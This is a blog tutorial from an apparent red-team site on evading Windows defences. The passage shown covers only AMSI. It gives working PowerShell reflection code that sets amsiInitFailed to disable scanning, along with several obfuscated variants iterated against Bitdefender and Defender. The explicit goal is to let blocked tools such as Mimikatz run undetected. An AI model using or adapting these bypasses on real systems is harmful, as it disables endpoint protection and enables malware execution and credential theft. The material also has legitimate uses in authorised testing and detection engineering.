<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><link rel="canonical" href="https://www.redteamrecipes.com/2025/12/Evasion/"><title>Windows Defense Evasion Guide | RTR</title><meta name="description" content="The only cookbook where evasions are on the menu"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><link rel="icon" href="/favicons/favicon.ico"><link rel="apple-touch-icon" href="/favicons/favicon.ico"><link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg"><link rel="preload" href="/style/base.css" as="style"><link rel="preload" href="/js/common.js" as="script"><link rel="stylesheet" href="/style/base.css"><meta name="description" content="Antimalware Scan Interface [ AMSI ]Antimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a signature-based scan of the content.
Windows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript.."><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/feed.atom" title="RedTeam Recipes" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">RedTeam Recipes</a></h2></section><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/" target="_top">Home</a></h3><h3 class="is-inline-block"><a href="/about/" target="_top">About</a></h3><h3 class="is-inline-block"><a href="/contact/" target="_top">contact</a></h3><h3 class="is-inline-block"><a href="/services/" target="_top">services</a></h3><h3 class="is-inline-block"><a href="/hall-of-fame/" target="_top">hall of fame</a></h3><h3 class="is-inline-block"><a href="/questions/" target="_top">questions</a></h3><h3 class="is-inline-block"><a href="/partners/" target="_top">trusted partners</a></h3><h3 class="is-inline-block"><a href="/privacy-policy/" target="_top">privacy policy</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/" target="_top">Home</a></h3><h3 class="is-inline-block"><a href="/about/" target="_top">About</a></h3><h3 class="is-inline-block"><a href="/contact/" target="_top">contact</a></h3><h3 class="is-inline-block"><a href="/services/" target="_top">services</a></h3><h3 class="is-inline-block"><a href="/hall-of-fame/" target="_top">hall of fame</a></h3><h3 class="is-inline-block"><a href="/questions/" target="_top">questions</a></h3><h3 class="is-inline-block"><a href="/partners/" target="_top">trusted partners</a></h3><h3 class="is-inline-block"><a href="/privacy-policy/" target="_top">privacy policy</a></h3></header><main><main class="container section post-page pt-4 px-3"><div class="columns content is-flex-desktop is-justify-content-center is-flex-direction-row-reverse px-1"><div class="column is-3 toc-container is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Antimalware-Scan-Interface-AMSI"><span class="toc-text">Antimalware Scan Interface [ AMSI ]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Forcing"><span class="toc-text">Error Forcing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Obfuscation"><span class="toc-text">Obfuscation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#String-Splitting-and-Concatenation"><span class="toc-text">String Splitting and Concatenation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64-Encoding"><span class="toc-text">Base64 Encoding</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memory-Patch"><span class="toc-text">Memory Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppLocker-and-Powershell-CLM"><span class="toc-text">AppLocker and Powershell CLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Hash-restrictions-bypass"><span class="toc-text">Path &#x2F; Hash restrictions bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InstallUtil-Shell-Updated-Part"><span class="toc-text">InstallUtil - Shell ( Updated Part )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-Updated-Part"><span class="toc-text">WMIC ( Updated Part )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alternate-Data-Stream"><span class="toc-text">Alternate Data Stream</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-CLM-Bypass"><span class="toc-text">Powershell CLM Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShdll"><span class="toc-text">PowerShdll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TEMP-ORARY-Updated-Part"><span class="toc-text">%TEMP%ORARY ( Updated Part )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerShell-Logging"><span class="toc-text">PowerShell Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-Transcription"><span class="toc-text">PowerShell Transcription</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-Transcription-Bypass"><span class="toc-text">PowerShell Transcription Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script-Block-Logging"><span class="toc-text">Script Block Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ScriptBlock-Bypass"><span class="toc-text">ScriptBlock Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Module-Logging"><span class="toc-text">Module Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Module-Logging-Bypass"><span class="toc-text">Module Logging Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#footer"><span class="toc-text">Comments and More</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/categories/Network/"><i class="tag post-item-tag">Network</i></a><a href="/tags/Evasion/"><i class="tag post-item-tag">Evasion</i></a><a href="/tags/Windows/"><i class="tag post-item-tag">Windows</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Windows Defense Evasion Guide</h1><time class="has-text-grey" datetime="2025-11-30T22:00:00.000Z">2025-12-01</time><article class="mt-2 post-content"><div class="is-hidden-tablet mb-4"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Antimalware-Scan-Interface-AMSI"><span class="toc-text">Antimalware Scan Interface [ AMSI ]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Forcing"><span class="toc-text">Error Forcing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Obfuscation"><span class="toc-text">Obfuscation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#String-Splitting-and-Concatenation"><span class="toc-text">String Splitting and Concatenation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64-Encoding"><span class="toc-text">Base64 Encoding</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memory-Patch"><span class="toc-text">Memory Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppLocker-and-Powershell-CLM"><span class="toc-text">AppLocker and Powershell CLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-Hash-restrictions-bypass"><span class="toc-text">Path &#x2F; Hash restrictions bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InstallUtil-Shell-Updated-Part"><span class="toc-text">InstallUtil - Shell ( Updated Part )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-Updated-Part"><span class="toc-text">WMIC ( Updated Part )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alternate-Data-Stream"><span class="toc-text">Alternate Data Stream</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-CLM-Bypass"><span class="toc-text">Powershell CLM Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShdll"><span class="toc-text">PowerShdll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TEMP-ORARY-Updated-Part"><span class="toc-text">%TEMP%ORARY ( Updated Part )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerShell-Logging"><span class="toc-text">PowerShell Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-Transcription"><span class="toc-text">PowerShell Transcription</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-Transcription-Bypass"><span class="toc-text">PowerShell Transcription Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script-Block-Logging"><span class="toc-text">Script Block Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ScriptBlock-Bypass"><span class="toc-text">ScriptBlock Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Module-Logging"><span class="toc-text">Module Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Module-Logging-Bypass"><span class="toc-text">Module Logging Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#footer"><span class="toc-text">Comments and More</span></a></li></ol></div><div><h2 id="Antimalware-Scan-Interface-AMSI"><a href="#Antimalware-Scan-Interface-AMSI" class="headerlink" title="Antimalware Scan Interface [ AMSI ]"></a>Antimalware Scan Interface [ AMSI ]</h2><p>Antimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style="color:yellow">signature-based scan of the content</span>.</p>
<p>Windows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.</p>
<p>So how does AMSI work :</p>
<ul>
<li>When AMSI is invoked, <span style="color:yellow">AMSI.dll</span> is loaded into the application’s memory.</li>
<li>The key functions within AMSI.dll include <code>AmsiScanBuffer</code> and <code>AmsiInitialize</code>.</li>
<li>If the content is clear it will return 1 means the script will be executed</li>
</ul>
<p>Let’s see :</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>let’s see what Windows version is Copy<br>that is running and what antivirus software that is installed</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">Get-WmiObject</span> Win32_OperatingSystem | <span class="built_in">Select</span> PSComputerName, Caption, Version | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">PSComputerName : ATTACKER</span><br><span class="line">Caption        : Microsoft Windows <span class="number">10</span> Pro</span><br><span class="line">Version        : <span class="number">10.0</span>.<span class="number">19045</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> root/SecurityCenter2 <span class="literal">-ClassName</span> AntivirusProduct</span><br><span class="line"></span><br><span class="line">displayName              : Bitdefender Antivirus</span><br><span class="line">instanceGuid             : &#123;<span class="number">0</span>F59B032<span class="literal">-EA77-E3A8-2382-74A4346E5522</span>&#125;</span><br><span class="line">pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe</span><br><span class="line">pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\wsccommunicator.exe</span><br><span class="line">productState             : <span class="number">266240</span></span><br><span class="line">PSComputerName           :</span><br><span class="line"></span><br><span class="line">displayName              : Windows Defender</span><br><span class="line">instanceGuid             : &#123;D68DDC3A<span class="literal">-831F-4fae-9E44-DA132C1ACF46</span>&#125;</span><br><span class="line">pathToSignedProductExe   : windowsdefender://</span><br><span class="line">pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe</span><br><span class="line">productState             : <span class="number">393472</span></span><br><span class="line">PSComputerName           :</span><br></pre></td></tr></table></figure></figure>

<p>Let’s test AMSI</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">Invoke-Mimikatz</span></span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ <span class="built_in">Invoke-Mimikatz</span></span><br><span class="line">+ ~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="string">&quot;Invoke&quot;</span>+<span class="string">&quot;Mimikatz&quot;</span></span><br><span class="line">InvokeMimikatz</span><br></pre></td></tr></table></figure></figure>

<p>Okay AMSI works well let’s try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]</p>
<h3 id="Error-Forcing"><a href="#Error-Forcing" class="headerlink" title="Error Forcing"></a>Error Forcing</h3><p>Error forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style="color:yellow">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.</p>
<p>Let’s see an example , and break it into lines</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$w</span> = <span class="string">&#x27;System.Management.Automation.A&#x27;</span>;<span class="variable">$c</span> = <span class="string">&#x27;si&#x27;</span>;<span class="variable">$m</span> = <span class="string">&#x27;Utils&#x27;</span></span><br><span class="line"><span class="variable">$assembly</span> = [<span class="type">Ref</span>].Assembly.GetType((<span class="string">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class="operator">-f</span> <span class="variable">$w</span>,<span class="variable">$c</span>,<span class="variable">$m</span>))</span><br><span class="line"><span class="variable">$field</span> = <span class="variable">$assembly</span>.GetField((<span class="string">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class="operator">-f</span> </span><br><span class="line"><span class="variable">$c</span>),<span class="string">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class="line"><span class="variable">$field</span>.SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></figure>

<ul>
<li>$w &#x3D; ‘System.Management.Automation.A’;$c &#x3D; ‘si’;$m &#x3D; ‘Utils’</li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$w</span> = <span class="string">&#x27;System.Management.Automation.A&#x27;</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;si&#x27;</span></span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;Utils&#x27;</span></span><br></pre></td></tr></table></figure></figure>

<p>We have 3 variables here $w , $c , $m if u combine them u will get <code>System.Management.Automation.AmsiUtils</code> but what is it ?</p>
<p><code>System.Management.Automation.AmsiUtils</code> is a class within the .NET framework that is part of the <code>System.Management.Automation</code> namespace.</p>
<p>The primary purpose of <code>System.Management.Automation.AmsiUtils</code> is to provide utilities for interacting with AMSI. <span style="color:yellow">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.</p>
<ul>
<li>$assembly &#x3D; [Ref].Assembly.GetType((‘{0}m{1}{2}’ -f $w,$c,$m))</li>
</ul>
<p>Let’s see it in a good way without variables</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$assembly</span> = [<span class="type">Ref</span>].Assembly.GetType((<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>))</span><br></pre></td></tr></table></figure></figure>

<p>So what does that mean ?</p>
<p>In the context of AMSI bypass techniques, obtaining the type information for <code>System.Management.Automation.AmsiUtils</code> is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using <span style="color:yellow">reflection</span>, you can access and manipulate private and internal members of the class, such as the <code>amsiInitFailed</code> field.</p>
<p>But what is reflection ?</p>
<p>Reflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style="color:yellow">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.</p>
<p>Let’s see an important screenshot</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def1.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>When you see this output, it means that :</p>
<ol>
<li>The type <code>AmsiUtils</code> is successfully retrieved from the assembly, indicating that AMSI is present and recognized.</li>
<li>Since <code>AmsiUtils</code> is not public, it suggests that the class is intended for internal use within the .NET assembly.</li>
<li>The type inherits from <code>System.Object</code>, which is typical for most classes in .NET</li>
</ol>
<ul>
<li>$field &#x3D; $assembly.GetField((‘am{0}InitFailed’ -f $c),’NonPublic,Static’)</li>
</ul>
<p>Let’s see it in a good way without variables</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$field</span> = [<span class="type">Ref</span>].Assembly.GetType((<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>, <span class="string">&#x27;NonPublic,Static&#x27;</span>)</span><br></pre></td></tr></table></figure></figure>

<p>This line retrieves the field <code>amsiInitFailed</code> from the <code>AmsiUtils</code> type. The <code>NonPublic</code> and <code>Static</code> flags indicate that it is a non-public (private or protected) static field.</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def2.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<ul>
<li>$field.SetValue($null,$true)</li>
</ul>
<p>Let’s see it in a good way without variables</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType((<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>, <span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></figure>

<p>By setting the value of the <code>amsiInitFailed</code> field to <code>true</code>, the script tricks PowerShell into believing that <span style="color:yellow">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI’s scanning functionality.</p>
<p>Nice now we break it let’s see bypass the AMSI</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def3.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>We filed! , That’s okay</p>
<p><a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">This command is very popular in AMSI bypass</a> so it’s regular to be detected</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def4.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<h3 id="Obfuscation"><a href="#Obfuscation" class="headerlink" title="Obfuscation"></a>Obfuscation</h3><p>Obfuscation in AMSI bypass refers to techniques used to <span style="color:yellow">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass</p>
<h4 id="String-Splitting-and-Concatenation"><a href="#String-Splitting-and-Concatenation" class="headerlink" title="String Splitting and Concatenation"></a>String Splitting and Concatenation</h4><p>We tested it before in our last example but let us make it work</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def5.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>Let’s use <a target="_blank" rel="noopener" href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> to see why we are blocked from <a target="_blank" rel="noopener" href="https://www.bitdefender.com/">Bitdefender</a></p>
<p>Make an exception for ur dir to test the scripts</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def6.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Okay now we know where is the AMSI detect us let’s see how we can bypass it , We see it from the last example so i don’t need to explain what i do again</p>
<p>from</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ReF</span>=[<span class="type">ReF</span>].AsSemBlY.GEtTypE(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class="line"><span class="variable">$Ref</span>.GetFIElD(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class="variable">$NULl</span>,<span class="variable">$truE</span>);</span><br></pre></td></tr></table></figure></figure>

<p>To</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$w</span> = <span class="string">&#x27;System.Management.Automation.A&#x27;</span>;<span class="variable">$c</span> = <span class="string">&#x27;si&#x27;</span>;<span class="variable">$m</span> = <span class="string">&#x27;Utils&#x27;</span></span><br><span class="line"><span class="variable">$assembly</span> = [<span class="type">Ref</span>].Assembly.GetType((<span class="string">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class="operator">-f</span> <span class="variable">$w</span>,<span class="variable">$c</span>,<span class="variable">$m</span>))</span><br><span class="line"><span class="variable">$field</span> = <span class="variable">$assembly</span>.GetField((<span class="string">&#x27;am&#123;0&#125;InitFailed&#x27;</span> <span class="operator">-f</span> </span><br><span class="line"><span class="variable">$c</span>),<span class="string">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class="line"><span class="variable">$field</span>.SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></figure>

<p>Let’s see if this work</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def7.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>The AMSI told us it’s clean but we are still on the radar , It doesn’t work again !!</p>
<p>So i try to use more variables and concatinate them</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$namespace</span> = <span class="string">&#x27;System.Management.Automation&#x27;</span></span><br><span class="line"><span class="variable">$classPrefix</span> = <span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$propertyName</span> = <span class="string">&#x27;InitFailed&#x27;</span></span><br><span class="line"><span class="variable">$visibility</span> = <span class="string">&#x27;NonPublic,Static&#x27;</span></span><br><span class="line"><span class="variable">$w</span> = <span class="string">&quot;<span class="variable">$namespace</span>.<span class="variable">$classPrefix</span>&quot;</span> <span class="comment"># System.Management.Automation.A </span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;si&#x27;</span></span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;Utils&#x27;</span></span><br><span class="line"><span class="variable">$fullClassName</span> = <span class="string">&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27;</span> <span class="operator">-f</span> <span class="variable">$w</span>, <span class="variable">$c</span>, <span class="variable">$m</span> <span class="comment">#System.Management.Automation.AmsiUtils</span></span><br><span class="line"><span class="variable">$assembly</span> = [<span class="type">Ref</span>].Assembly.GetType(<span class="variable">$fullClassName</span>)</span><br><span class="line"><span class="variable">$propertyFullName</span> = <span class="string">&#x27;am&#123;0&#125;&#123;1&#125;&#x27;</span> <span class="operator">-f</span> <span class="variable">$c</span>, <span class="variable">$propertyName</span></span><br><span class="line"><span class="variable">$field</span> = <span class="variable">$assembly</span>.GetField(<span class="variable">$propertyFullName</span>, <span class="variable">$visibility</span>)</span><br><span class="line"><span class="variable">$field</span>.SetValue(<span class="variable">$null</span>, <span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></figure>

<p>Let’s try to check this out with <a target="_blank" rel="noopener" href="https://github.com/gatariee/gocheck">gocheck</a> and see if it works</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def8.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>It doesn’t work again, Am…</p>
<p>At this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea</p>
<p>We can use <span style="color:yellow">environment variables</span> to evade detection by the antivirus , Let’s craft our script</p>
